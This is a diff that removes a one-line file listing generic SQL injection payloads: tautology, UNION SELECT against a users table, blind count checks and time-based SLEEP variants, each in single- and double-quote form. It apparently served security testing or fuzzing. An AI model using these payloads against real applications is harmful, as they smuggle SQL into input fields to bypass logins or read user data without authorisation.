@@ -1,1 +1,0 @@
--- Simple SQL Injection\na' OR '1'='1\na" OR "1"="1\n\n-- Union-based SQL Injection\na' UNION SELECT * FROM users --\na" UNION SELECT * FROM users --\n\n-- Blind SQL Injection\na' AND (SELECT COUNT(*) FROM users) > 0 --\na" AND (SELECT COUNT(*) FROM users) > 0 --\n\n-- Time-based SQL Injection\na' AND SLEEP(5) --\na" AND SLEEP(5) --
